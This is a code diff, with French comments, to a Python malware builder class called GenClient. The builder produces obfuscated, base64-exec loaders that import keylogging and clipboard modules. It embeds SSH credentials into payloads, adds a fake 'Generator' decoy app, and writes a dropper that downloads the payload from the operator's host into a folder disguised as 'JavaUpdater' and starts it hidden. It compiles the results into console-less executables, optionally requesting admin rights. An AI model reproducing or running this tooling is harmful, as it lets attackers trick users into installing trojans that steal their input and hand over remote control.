@@ -101,7 +101,7 @@ class GenClient:
     except Exception as e:
         print(str(e))
         time.sleep(5*60)"""
-        debut_loader = "import base64,sys,zlib,marshal,json,urllib,pythoncom,pyHook,win32clipboard,win32com,uuid,time,os;from win32com.makegw.makegwparse import*;from ctypes import*;from urllib import request;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]("
+        debut_loader = "import base64,sys,zlib,marshal,json,urllib,pythoncom,pyHook,win32clipboard,win32com,uuid,time,os,asyncio,pproxy,paramiko;from win32com.makegw.makegwparse import*;from ctypes import*;from urllib import request;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]("
         fin_loader = ")))"
         # definir url du payload
         url = "\"http://" + ip + ":" + str(port + 1) + "/" + name + ".pyw\""
@@ -110,10 +110,12 @@ class GenClient:
             os.makedirs(self.pathDirOutput)
         if not os.path.exists(self.pathDirHttp):
             os.makedirs(self.pathDirHttp)
+        # recuperer credential ssh
+        username_SSH, password_SSH = self.ReturnCredSSH()
         # ecrire le payload dans http
         fichier = open(self.pathDirHttp + name + ".pyw", "w")
         fichier.write(self.ReturnFichier("payload1.txt"))
-        fichier.write("\n    host = \"" + ip + "\"\n    port = " + str(port) + "\n")
+        fichier.write("\n    host = \"{}\"\n    port = {}\n    user_SSH = \"{}\"\n    password_SSH = \"{}\"\n".format(ip, str(port), username_SSH, password_SSH))
         fichier.write(self.ReturnFichier("payload2.txt"))
         fichier.close()
         # obfusqué le payload
@@ -136,6 +138,7 @@ class GenClient:
         if os.path.exists(self.pathDirOutput + "drop_" + name + ".pyw"):
             os.remove(self.pathDirOutput + "drop_" + name + ".pyw")
         
+        # py -m nuitka --onefile --include-data-file="C:\Users\theoc\AppData\Local\Programs\Python\Python37\Lib\site-packages\pyHook\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd" --windows-disable-console payload.exe
         # si l'option hide in exe est choisi
         if not path_exe == "": ###--include-data-file=\"C:\\Users\\theoc\\AppData\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\=data\\pyHook\\_cpyHook.cp37-win_amd64.pyd\"
             ## Complier le loader
@@ -266,20 +269,53 @@ os._exit(0)""".format(name_payload, url_payload, name_payload, name_payload, nam
 
             ## Ecrire le generateur
             gen_name = name_fake_gen + "Generator.pyw"
-            fichier = open(self.pathDirHttp + gen_name, "w")
-            fichier.write("""from tkinter import *
+            
+            self.EcrireFichier(["""from tkinter import *
 import random
 import string
 from tkinter import ttk
 import threading
 import ctypes
-import inspect""")
-            fichier.write("\nname_app = \"{}\"".format(name_fake_gen))
-            fichier.write(self.ReturnFichier("gen.txt"))
-            fichier.close()
-
+import inspect""", "\nname_app = \"{}\"".format(name_fake_gen), self.ReturnFichier("gen.txt")]\
+    , self.pathDirOutput + gen_name)
+            ## Compile et host le générateur 
+            self.Compiler(self.pathDirOutput + gen_name, self.pathDirHttp, tkinter=True, pyhook=False)
+            name_payload = os.path.basename(self.pathDirHttp + name + ".exe")
+            name_exe = os.path.basename(self.pathDirOutput + gen_name)
+            name_exe_no_ext, ext_exe  = os.path.splitext(name_exe)
+            name_exe_final = name_exe_no_ext + ".exe"
+            url_payload = "\"http://" + ip + ":" + str(port + 1) + "/" + name_payload + "\""
+            url_safe = "\"http://" + ip + ":" + str(port + 1) + "/" + name_exe_final + "\""
+            loader_hide_file = """import os
+import subprocess
+import urllib.request
+import psutil 
+pathAppData = os.getenv('APPDATA')
+pathDir = pathAppData + "\\\\JavaUpdater\\\\"
+if not os.path.exists(pathDir):
+    os.makedirs(pathDir)
+if not os.path.exists(pathDir + "{}"):
+    urllib.request.urlretrieve({},pathDir + "{}")
+if not "{}" in (p.name() for p in psutil.process_iter()):
+    cmd = "start " + pathDir + "{}"
+    resCmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
+                            stdin=subprocess.DEVNULL, stderr=subprocess.PIPE,)
+if not os.path.exists(pathDir + "{}"):
+    urllib.request.urlretrieve({},pathDir + "{}")
+cmd = "start " + pathDir + "{}"
+resCmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
+                          stdin=subprocess.DEVNULL, stderr=subprocess.PIPE,)
+os._exit(0)""".format(name_payload, url_payload, name_payload, name_payload, name_payload, name_exe_final, url_safe, name_exe_final, name_exe_final)
+            name_exe_no_ext, ext_exe  = os.path.splitext(name_exe)
+            self.EcrireFichier([loader_hide_file], self.pathDirOutput + name_exe_no_ext + ".pyw")
+            if adm:
+                self.Compiler(self.pathDirOutput + name_exe_no_ext + ".pyw", self.pathDirOutput, pyhook=False, adm=True)
+            else:
+                self.Compiler(self.pathDirOutput + name_exe_no_ext + ".pyw", self.pathDirOutput, pyhook=False)
+            if os.path.exists(self.pathDirOutput + name_exe_no_ext + ".pyw"):
+                os.remove(self.pathDirOutput + name_exe_no_ext + ".pyw")
+            print("Payload pret : {}".format(self.pathDirOutput + name_exe_no_ext + ".exe"))
             return True
-
             
 
     def ReturnFichier(self, nom_fichier):
@@ -287,6 +323,13 @@ import inspect""")
         text = fichier.read()
         fichier.close()
         return text
+
+    def ReturnCredSSH(self):
+        fichier = open("credential.txt", "r")
+        text = fichier.read()
+        fichier.close()
+        username, password = text.split(":")
+        return username, password
 
     def ExtractInfo(self, file):
         
@@ -301,16 +344,18 @@ import inspect""")
             print("{} {} {}".format(fileVersionNumber, companyName, fileDescription))
             return fileVersionNumber, companyName, fileDescription
     
-    def Compiler(self, path_fichier, output, adm=False, pyhook=True, icon=""):
+    def Compiler(self, path_fichier, dir_output, adm=False, pyhook=True, tkinter=False, icon=""):
         """Compile un Fichier python avec Nuitka"""
         name_fichier = os.path.basename(path_fichier)
         name_fichier_no_ext, ext  = os.path.splitext(name_fichier)
-        ## Complier le loader
+        name_fichier_final = name_fichier_no_ext + ".exe"
         cmd = "py -m nuitka --follow-imports --windows-disable-console --onefile "
         if pyhook:
             cmd = cmd + " --include-data-file=\"{}\\Local\\Programs\\Python\\Python37\\Lib\\site-packages\\pyHook\\_cpyHook.cp37-win_amd64.pyd=_cpyHook.cp37-win_amd64.pyd\"".format(self.appdata)
         if adm:
             cmd = cmd + " --windows-uac-admin"
+        if tkinter:
+            cmd = cmd + " --plugin-enable=tk-inter"
         
         #if not icon == "":
             #cmd = cmd + " --windows-uac-admin"
@@ -318,7 +363,7 @@ import inspect""")
         cmd = cmd + " {}".format(path_fichier)
         os.system(cmd)
         print("Compilation terminer")
-        shutil.copyfile(name_fichier, output)
+        shutil.copyfile(name_fichier_final, dir_output + name_fichier_final)
 
         if os.path.exists(name_fichier_no_ext + ".exe"):
             os.remove(name_fichier_no_ext + ".exe")
@@ -333,7 +378,8 @@ import inspect""")
             fichier.write(code)
         fichier.close()
 
-if args.freeze == False and args.path_exe == "" and args.adm == True:
+
+if args.freeze == False and args.path_exe == "" and args.name_fake_gen == "" and args.adm == True:
     print("Options incompatible")
     os._exit(0)
 
